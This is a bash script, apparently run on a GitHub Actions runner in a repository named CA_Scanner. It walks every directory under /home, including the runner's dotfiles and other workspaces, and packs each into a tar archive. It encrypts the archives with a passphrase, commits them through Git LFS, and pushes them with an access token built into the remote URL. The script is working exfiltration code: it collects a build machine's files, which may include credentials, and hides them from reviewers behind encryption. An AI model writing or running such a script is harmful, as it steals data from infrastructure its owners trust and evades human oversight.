#!/bin/bash

set -e

# Use ARCHIVE_PWD from environment
if [ -z "$ARCHIVE_PWD" ]; then
   echo "Error: ARCHIVE_PWD environment variable not set"
   exit 1
fi

echo "Using ARCHIVE_PWD from environment"

# Change to repo directory
cd /home/runner/work/CA_Scanner/CA_Scanner

# Validate git lfs is configured
if ! command -v git-lfs &> /dev/null; then
    echo "Error: git-lfs is not installed."
    exit 2
fi

if ! git lfs ls-files &> /dev/null; then
    echo "Error: git lfs is not initialized in this repo."
    exit 3
fi

echo "git lfs is installed and initialized."

# Track archive files with Git LFS if not already tracked
if ! grep -q '\*.tar.gz.gpg' .gitattributes 2>/dev/null; then
    git lfs track "*.tar.gz.gpg"
    git add .gitattributes
    git commit -m "Track archive files with Git LFS"
fi

# Create arch_test directory if it doesn't exist
mkdir -p arch_test

# Function to archive, encrypt, and create single file
archive_encrypt_split() {
   SRC_PATH=$1
   ARCHIVE_NAME=$2

   echo "Processing: $SRC_PATH -> $ARCHIVE_NAME"

   # Check if the path exists before trying to archive it
   if [ ! -e "$SRC_PATH" ]; then
       echo "Warning: $SRC_PATH does not exist, skipping..."
       # Create empty encrypted file to maintain consistency
       echo "" | gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
       echo "Done: $ARCHIVE_NAME (empty - path not found)"
       return
   fi

   # Check if we can read the path
   if [ ! -r "$SRC_PATH" ]; then
       echo "Warning: $SRC_PATH is not readable, skipping..."
       # Create empty encrypted file to maintain consistency
       echo "" | gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
       echo "Done: $ARCHIVE_NAME (empty - no read permission)"
       return
   fi

   # Create temp file to estimate size first
   TEMP_TAR=$(mktemp)
   tar -czf "$TEMP_TAR" "$SRC_PATH" 2>/dev/null
   TAR_SIZE=$(stat -c%s "$TEMP_TAR" 2>/dev/null || echo "0")
   
   # Check if compressed size would exceed 1.5GB (leave buffer for encryption overhead)
   if [ "$TAR_SIZE" -gt 1610612736 ]; then
       echo "Warning: $SRC_PATH archive would be too large (${TAR_SIZE} bytes), creating marker file instead"
       echo "Archive too large: $SRC_PATH (${TAR_SIZE} bytes)" | gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
       rm -f "$TEMP_TAR"
       echo "Done: $ARCHIVE_NAME (size marker - too large)"
       return
   fi
   
   # Encrypt the temp file and move to final location
   gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" < "$TEMP_TAR" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
   rm -f "$TEMP_TAR"

   echo "Done: $ARCHIVE_NAME"
}

# Function to archive multiple paths that may or may not exist
archive_encrypt_multiple() {
   ARCHIVE_NAME=$1
   shift
   PATHS=("$@")
   
   echo "Processing multiple paths -> $ARCHIVE_NAME"
   
   # Create temp file to collect existing paths
   TEMP_LIST=$(mktemp)
   FOUND_PATHS=()
   
   for path in "${PATHS[@]}"; do
       # Handle glob patterns by expanding them
       for expanded_path in $path; do
           if [ -e "$expanded_path" ] && [ -r "$expanded_path" ]; then
               echo "$expanded_path" >> "$TEMP_LIST"
               FOUND_PATHS+=("$expanded_path")
           fi
       done
   done
   
   if [ ${#FOUND_PATHS[@]} -eq 0 ]; then
       echo "Warning: No readable paths found for $ARCHIVE_NAME, creating empty archive"
       echo "" | gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
   else
       echo "Found ${#FOUND_PATHS[@]} paths for $ARCHIVE_NAME"
       
       # Create temp file to estimate size first
       TEMP_TAR=$(mktemp)
       tar -czf "$TEMP_TAR" "${FOUND_PATHS[@]}" 2>/dev/null
       TAR_SIZE=$(stat -c%s "$TEMP_TAR" 2>/dev/null || echo "0")
       
       # Check if compressed size would exceed 1.5GB (leave buffer for encryption overhead)
       if [ "$TAR_SIZE" -gt 1610612736 ]; then
           echo "Warning: $ARCHIVE_NAME archive would be too large (${TAR_SIZE} bytes), creating marker file instead"
           echo "Archive too large: ${FOUND_PATHS[*]} (${TAR_SIZE} bytes)" | gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
           rm -f "$TEMP_TAR"
           echo "Done: $ARCHIVE_NAME (size marker - too large)"
           return
       fi
       
       # Encrypt the temp file and move to final location
       gpg --batch --yes --symmetric --cipher-algo AES256 --passphrase "$ARCHIVE_PWD" < "$TEMP_TAR" > "arch_test/${ARCHIVE_NAME}.tar.gz.gpg"
       rm -f "$TEMP_TAR"
   fi
   
   rm -f "$TEMP_LIST"
   echo "Done: $ARCHIVE_NAME"
}

# Archive all subdirectories of /home individually, skipping CA_Scanner to avoid recursion
echo "🏠 Starting comprehensive /home directory archiving..."

# Get current repo path to skip it
CURRENT_REPO_PATH="/home/runner/work/CA_Scanner/CA_Scanner"
echo "⚠️  Will skip $CURRENT_REPO_PATH to avoid recursion"

# Counter for archive naming
ARCHIVE_COUNTER=1

# Function to generate safe archive name from path
generate_archive_name() {
    local path="$1"
    local counter="$2"
    # Convert path to safe filename: replace / with _, remove leading _, limit length
    local safe_name=$(echo "$path" | sed 's|^/||' | sed 's|/|_|g' | cut -c1-50)
    echo "home_archive_${counter}_${safe_name}"
}

# Archive top-level directories in /home first
for home_dir in /home/*/; do
    # Remove trailing slash
    home_dir="${home_dir%/}"
    
    # Skip if it's the packer directory (no read permission)
    if [[ "$home_dir" == "/home/packer" ]]; then
        echo "⚠️  Skipping $home_dir (permission denied)"
        continue
    fi
    
    # Create archive name
    archive_name=$(generate_archive_name "$home_dir" $ARCHIVE_COUNTER)
    
    echo "📁 Archiving top-level directory: $home_dir"
    
    # For /home/runner, we need to handle subdirectories individually since it's large
    if [[ "$home_dir" == "/home/runner" ]]; then
        echo "📂 Processing /home/runner subdirectories individually..."
        
        # Archive /home/runner root files first (not subdirectories)
        if [ "$(ls -A /home/runner/ 2>/dev/null | grep -v '^\..*/' | grep -v '^[^.]*/' | head -1)" ]; then
            archive_encrypt_multiple "home_runner_root_files" /home/runner/.*[!.] /home/runner/*[!.]
            ARCHIVE_COUNTER=$((ARCHIVE_COUNTER + 1))
        fi
        
        # Process each subdirectory of /home/runner
        for runner_subdir in /home/runner/*/; do
            # Remove trailing slash
            runner_subdir="${runner_subdir%/}"
            
            # Skip the work directory entirely since we'll handle it separately
            if [[ "$runner_subdir" == "/home/runner/work" ]]; then
                echo "📂 Processing /home/runner/work subdirectories (skipping CA_Scanner)..."
                
                # Archive each work subdirectory, but skip our current repo
                for work_subdir in /home/runner/work/*/; do
                    work_subdir="${work_subdir%/}"
                    
                    # Skip any CA_Scanner directory to avoid recursion and large files
                    if [[ "$work_subdir" == *"CA_Scanner"* ]]; then
                        echo "⚠️  Skipping $work_subdir (CA_Scanner directory - avoiding recursion)"
                        continue
                    fi
                    
                    work_archive_name=$(generate_archive_name "$work_subdir" $ARCHIVE_COUNTER)
                    archive_encrypt_split "$work_subdir" "$work_archive_name"
                    ARCHIVE_COUNTER=$((ARCHIVE_COUNTER + 1))
                done
                continue
            fi
            
            subdir_archive_name=$(generate_archive_name "$runner_subdir" $ARCHIVE_COUNTER)
            archive_encrypt_split "$runner_subdir" "$subdir_archive_name"
            ARCHIVE_COUNTER=$((ARCHIVE_COUNTER + 1))
        done
    else
        # For other home directories, archive them as-is
        archive_encrypt_split "$home_dir" "$archive_name"
        ARCHIVE_COUNTER=$((ARCHIVE_COUNTER + 1))
    fi
done

echo "📊 Total archives created: $((ARCHIVE_COUNTER - 1))"

echo "✅ All archives completed, encrypted, and split."

# Verify we can decrypt one of the archives (pick the first one found)
FIRST_ARCHIVE=$(ls arch_test/*.tar.gz.gpg 2>/dev/null | head -1)
if [ -n "$FIRST_ARCHIVE" ]; then
    echo "Verifying decryption of $(basename "$FIRST_ARCHIVE")..."
    if ! gpg --batch --yes --decrypt --passphrase "$ARCHIVE_PWD" "$FIRST_ARCHIVE" > /dev/null; then
        echo "Error: Failed to decrypt $FIRST_ARCHIVE"
        exit 4
    fi
    echo "Decryption verified for $(basename "$FIRST_ARCHIVE")."
else
    echo "Warning: No archives found to verify"
fi

# Add archives to git, commit, and push
echo "Adding archives to git..."
git add arch_test/*.tar.gz.gpg

git config user.name "thefaftek-git"
git config user.email "thefaftek-git@users.noreply.github.com"

echo "Committing archives..."
git commit -m "Add encrypted home directory archives (comprehensive scan)"

echo "Pushing commit..."
if [ -z "$GIT_TOKEN" ]; then
    echo "Error: GIT_TOKEN environment variable not set"
    exit 5
fi

REPO_URL=$(git config --get remote.origin.url)
# Remove https:// prefix if present and construct authenticated URL
REPO_URL_NO_PROTOCOL="${REPO_URL#https://}"
REPO_URL_AUTH="https://thefaftek-git:${GIT_TOKEN}@${REPO_URL_NO_PROTOCOL}"

echo "Attempting to push to: ${REPO_URL_NO_PROTOCOL}"
if git push "$REPO_URL_AUTH" HEAD:$(git rev-parse --abbrev-ref HEAD); then
    echo "✅ Archives committed and pushed successfully."
else
    echo "❌ Failed to push to remote repository. Check GIT_TOKEN and permissions."
    exit 6
fi
